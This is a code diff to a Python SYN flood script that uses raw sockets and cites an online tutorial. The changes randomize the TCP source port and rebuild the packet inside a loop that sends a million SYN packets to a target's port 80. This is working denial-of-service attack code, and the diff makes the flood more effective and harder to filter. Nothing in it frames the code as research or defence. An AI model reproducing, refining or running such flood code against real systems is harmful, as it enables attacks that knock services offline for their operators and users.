@@ -4,6 +4,7 @@
 
 # some imports
 import socket, sys
+from random import randrange
 from struct import *
 #with help of this site #https://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
 
@@ -56,11 +57,12 @@ def creat(source_ip,dest_ip):
 
     ihl_version = (version << 4) + ihl
 
+
     # the ! in the pack format string means network order
     ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 
     # tcp header fields
-    source = 1234  # source port
+    source = randrange(64000)  # source port
     dest = 80  # destination port
     seq = 0
     ack_seq = 0
@@ -106,9 +108,9 @@ def creat(source_ip,dest_ip):
 def syn_flood(src,dst):
     iterations = 100
     batch = 10000
-    s,packet= creat(src,dst)
     for i in range(iterations):
         for b in range (batch):
+            s, packet = creat(src, dst)
             print(f"i {i} , b {b}")
             s.sendto(packet, (dst, 0))  # put this in a loop if you want to flood the target
 
